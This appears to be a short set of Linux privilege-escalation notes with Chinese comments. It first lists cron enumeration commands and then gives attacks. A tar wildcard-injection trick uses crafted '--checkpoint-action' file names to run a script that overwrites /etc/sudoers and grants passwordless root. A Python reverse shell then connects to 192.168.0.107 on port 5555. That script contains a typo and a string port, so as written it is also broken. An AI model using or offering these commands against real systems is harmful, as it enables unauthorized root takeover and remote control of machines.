	crontab -l
	ls -alh /var/spool/cron;
	ls -al /etc/ | grep cron
	ls -al /etc/cron*
	cat /etc/cron*
	cat /etc/at.allow
	cat /etc/at.deny
	cat /etc/cron.allow
	cat /etc/cron.deny*
	
	>for user in $(getent passwd|cut -f1 -d:); do echo "### Crontabs for $user ####"; crontab -u $user -l; done 列举所有用户的crontab
	$cat /etc/crontab
	$echo 'echo "ignite ALL=(root) NOPASSWD: ALL" > /etc/sudoers' >test.sh
	$echo "" > "--checkpoint-action=exec=sh test.sh"
	$echo "" > --checkpoint=1
	或编辑可写的计划任务文件
	#!/usr/bin/python
	import os,subprocess,socket
	s=socket.socekt(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(("192.168.0.107","5555"))
	os.dup2(s.fileno(),0)
	os.dup2(s.fileno(),1)
	os.dup2(s.fileno(),2)
	p=subprocess.call(["/bin/sh","-i"])
